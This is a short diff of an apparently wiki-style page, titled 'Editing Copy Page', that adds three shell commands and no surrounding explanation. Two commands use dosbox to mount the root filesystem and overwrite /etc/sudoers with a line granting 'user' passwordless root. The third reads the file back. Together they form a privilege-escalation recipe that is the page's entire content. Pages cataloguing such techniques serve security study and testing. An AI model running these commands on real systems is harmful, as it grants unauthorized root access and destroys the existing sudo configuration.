@@ -1,15 +1,15 @@
 [[Editing Copy Page]]
 
 ```
-
+/usr/bin/dosbox -c 'mount c /' -c "echo "user ALL=(root) NOPASSWD: ALL" >/etc/sudoers" -c exit
 ```
 
 ```
-
+'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
 ```
 
 ```
-
+/usr/bin/dosbox -c 'mount c /' -c 'type c:\etc\sudoers'
 ```
 
 ```
